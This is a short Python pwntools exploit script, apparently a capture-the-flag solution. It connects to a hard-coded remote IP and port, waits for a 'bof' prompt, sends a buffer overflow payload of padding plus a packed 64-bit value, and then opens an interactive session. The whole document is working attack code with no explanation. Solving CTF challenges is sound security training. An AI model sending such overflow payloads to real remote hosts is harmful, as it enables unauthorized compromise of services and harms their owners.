from pwn import *

t = remote('111.198.29.45', 30866)
t.recvuntil('lets get helloworld for bof')
t.sendline('a' * 4 + p64(0x6E756161))
t.interactive()